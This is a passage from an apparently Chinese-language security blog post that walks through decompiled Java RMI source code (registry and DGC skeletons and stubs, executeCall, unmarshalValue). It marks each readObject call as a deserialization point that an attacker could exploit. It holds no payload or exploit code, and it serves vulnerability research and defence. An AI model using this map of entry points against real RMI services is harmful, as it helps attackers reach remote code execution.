&#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var85) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var85);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var86) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var86);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var84) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var84);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var80) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var80);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>最后就是服务端的操作，这里就是一个对称的过程，客户端反序列化，服务端就序列化，也是通过unmarshalValue方法或者marshalValue方法</p>
<h3 id="dgc回收"><a href="#dgc回收" class="headerlink" title="dgc回收"></a>dgc回收</h3><p>首先在服务端创建stub对象时会自动的创建一个DGCImpl_stub对象，它也有对应的DGCImpl_Skel，里面有dispatch方法，里面也有反序列化来获取参数值进行清理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">DGCImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (DGCImpl)var1;</span><br><span class="line">        ObjID[] var7;</span><br><span class="line">        <span class="type">long</span> var8;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                VMID var39;</span><br><span class="line">                <span class="type">boolean</span> var40;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var14</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])var14.readObject();</span><br><span class="line">                    var8 = var14.readLong();</span><br><span class="line">                    var39 = (VMID)var14.readObject();</span><br><span class="line">                    var40 = var14.readBoolean();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var36);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var37);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.clean(var7, var8, var39, var40);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var35) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var35);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                Lease var10;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var13</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])var13.readObject();</span><br><span class="line">                    var8 = var13.readLong();</span><br><span class="line">                    var10 = (Lease)var13.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var32);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var33);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Lease</span> <span class="variable">var11</span> <span class="operator">=</span> var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var12</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var12.writeObject(var11);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var31) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var31);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也有DGCImpl_Stub对象，它们的调用方法和RegistryImpl的对应相同，这里也调用了invoke方法，基本所有的客户端处理网络请求都调用了，所以这里也有一个利用点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, VMID var4, <span class="type">boolean</span> var5)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">0</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var7</span> <span class="operator">=</span> var6.getOutputStream();</span><br><span class="line">            var7.writeObject(var1);</span><br><span class="line">            var7.writeLong(var2);</span><br><span class="line">            var7.writeObject(var4);</span><br><span class="line">            var7.writeBoolean(var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var8);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var6);</span><br><span class="line">        <span class="built_in">super</span>.ref.done(var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var9;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var10) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var10;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var11);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Lease <span class="title function_">dirty</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getOutputStream();</span><br><span class="line">            var6.writeObject(var1);</span><br><span class="line">            var6.writeLong(var2);</span><br><span class="line">            var6.writeObject(var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var20);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var5);</span><br><span class="line"></span><br><span class="line">        Lease var24;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">var9</span> <span class="operator">=</span> var5.getInputStream();</span><br><span class="line">            var24 = (Lease)var9.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var17);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var18);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.ref.done(var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var24;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var21) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var21;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var22) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var22;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var23);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>客户端可能被反序列化的地方</p>
<p>在客户端远程连接服务器中它会出现两个调用readObject的地方，这里就可能会出现反序列化漏洞</p>
<p>首先是在StreamRemoteCall的executeCall方法里面会出现，这里会在invoke方法里面被调用，在处理远程连接时基本上都会调用这里方法，这里的后半段的switch里面当出现一个异常时就会进入其中调用readObject方法，这里其实是为了将异常的部分进行反序列化读取，但是如果服务器端传输了恶意代码就可能会导致用户端触发反序列化漏洞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">    <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">        Object ex;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ex = in.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// An exception should have been received,</span></span><br><span class="line">        <span class="comment">// if so throw it, else flag error</span></span><br><span class="line">        <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> Exception) &#123;</span><br><span class="line">            exceptionReceivedFromServer((Exception) ex);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return type not Exception&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Exception is thrown before fallthrough can occur</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            Transport.transportLog.log(Log.BRIEF,</span><br><span class="line">                <span class="string">&quot;return code invalid: &quot;</span> + returnType);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return code invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当客户端获取代理对象stub时是通过反序列化获取，这里就也会调用readObject方法</p>
<p>在调用RegistryImpl_Stub的lookup的方法里面就会触发</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">var23 = (Remote)var6.readObject();</span><br></pre></td></tr></table></figure>
<p>下面就是在客户端远程调用服务端方法时也有触发序列化，也会调用executeCall方法</p>
<p>在对于获取函数的返回值也是通过反序列化的，在UnicastRef的unmarshalValue方法里面来获取远程执行的结果，这里也是调用了readObject()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; type, ObjectInput in)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Integer.valueOf(in.readInt());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(in.readBoolean());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Byte.valueOf(in.readByte());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Character.valueOf(in.readChar());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Short.valueOf(in.readShort());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Long.valueOf(in.readLong());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Float.valueOf(in.readFloat());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Double.valueOf(in.readDouble());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注册中心的反序列化点</p>
<p>在RegistryImpl_Skel的dispatch就利用了反序列化来获取客户端插入的lookup的值不管是客户端通过bind lookup或者rebind，注册中心接收的参数都是通过反序列化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var94) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var94);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var95) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var95);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var93) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var93);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                var2.releaseInputStream();</span><br><span class="line">                String[] var97 = var6.list();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var92) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var92);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var85) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var85);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var86) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var86);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var84) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var84);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var81) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var81);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var82) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var82);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var80) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var80);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>服务端的反序列化点</p>
<p>这里是在对于客户端远程调用服务端的函数时，提交参数的方法是通过序列化进行传输，所以在服务端就是通过unmarshalValue来读取反序列后的参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; type, ObjectInput in)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Integer.valueOf(in.readInt());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(in.readBoolean());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Byte.valueOf(in.readByte());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Character.valueOf(in.readChar());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Short.valueOf(in.readShort());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Long.valueOf(in.readLong());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> Float.valueOf(in.readFloat());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> 